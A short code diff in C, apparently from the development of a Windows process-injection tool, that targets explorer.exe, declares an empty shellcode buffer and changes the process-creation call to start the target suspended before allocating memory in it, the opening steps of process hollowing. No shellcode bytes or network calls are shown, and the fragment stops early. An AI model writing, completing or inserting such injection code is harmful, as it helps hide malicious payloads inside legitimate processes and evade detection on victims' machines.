@@ -2,7 +2,7 @@
 
 // Configuration
 char *targetPath = "explorer.exe";
-unsigned char payloadBuffer[] = { /* shellcode bytes go here (unstable) */ };
+unsigned char payloadBuffer[] = { /* shellcode bytes go here */ };
 
 int main()
 {
@@ -11,7 +11,7 @@ int main()
     si.cb = sizeof(si);
 
     // 1. Create target process
-    CreateProcessA(NULL, targetPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+    CreateProcessA(NULL, targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     // 2. Allocate memory in target process
     SIZE_T payloadSize = sizeof(payloadBuffer);
